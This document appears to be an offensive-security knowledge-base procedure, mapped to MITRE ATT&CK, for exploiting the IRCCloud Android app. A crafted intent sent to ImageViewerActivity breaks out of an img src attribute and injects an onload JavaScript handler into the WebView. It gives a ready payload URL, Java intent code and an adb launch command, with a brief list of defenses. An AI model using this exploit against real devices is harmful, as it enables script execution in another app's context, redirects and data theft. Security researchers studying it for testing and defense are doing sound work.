---
id: proc-craft-malicious-intent-xss-001
tags:
  - xss
  - intent
  - poc
type: procedure
tools: []
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
commands:
  - '[[commands/launch-malicious-intent-to-imageviewactivity]]'
verified: false
platforms:
  - Android
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:52:39.323Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
---
# Craft and Execute Malicious Intent for XSS

## Summary

This procedure crafts a malicious Android intent targeting the ImageViewerActivity with a URL that breaks out of the img src attribute to inject JavaScript, then executes it to trigger XSS in the WebView, demonstrating arbitrary code execution.

## Description

Exploiting the IRCCloud app, the intent uses a data URI with a valid image URL followed by ' onload="JS_CODE"' to inject onload handlers. This can be launched from another app or via Instant Apps, leading to data exfiltration or redirects in the app's context. Requires ADB or a test app; outcomes include JS execution confirmation.

## Requirements

1. ADB installed and device connected
2. IRCCloud app on target device
3. Java environment for intent creation (or ADB shell)

## Defense

Defensive measures and detection strategies:

- Add intent verification in onCreate (e.g., check calling package)
- Use shouldOverrideUrlLoading in WebView to block suspicious loads
- Monitor app logs for unexpected intent launches

## Objectives

1. Inject JS via attribute breakout
2. Execute arbitrary code in WebView context
3. Verify impact like redirects or data theft

## Instructions

### Step 1: Craft the Malicious URL

**Context**: Build URL to breakout and inject JS.

Construct: "https://shoppersocial.me/wp-content/uploads/2016/06/wow.jpg' onload='window.location.href=\"http://yahoo.com\"" 

> Legit image + quote close + onload JS for redirect.

### Step 2: Create and Launch Intent

**Context**: Target the activity with malicious data.

Execute [[commands/launch-malicious-intent-to-imageviewactivity]]:

```java
Intent intent = new Intent(); intent.setClassName("com.irccloud.android","com.irccloud.android.activity.ImageViewerActivity"); intent.setData(Uri.parse("https://shoppersocial.me/wp-content/uploads/2016/06/wow.jpg' onload='window.location.href=\"http://yahoo.com\"")); startActivity(intent);
```

> Via ADB: adb shell am start -n com.irccloud.android/.activity.ImageViewerActivity -d "malicious_url"

### Step 3: Verify Execution

**Context**: Observe WebView behavior.

Launch activity and check for JS trigger (e.g., redirect).

**Expected Output**: WebView redirects to http://yahoo.com, confirming XSS.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution
- [[Collection]] Collection

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[JavaScript]] JavaScript

### Sub-Techniques


## Commands Used

- [[commands/launch-malicious-intent-to-imageviewactivity]]

## Tools Used


## Tags

- android-intent
- xss-poc
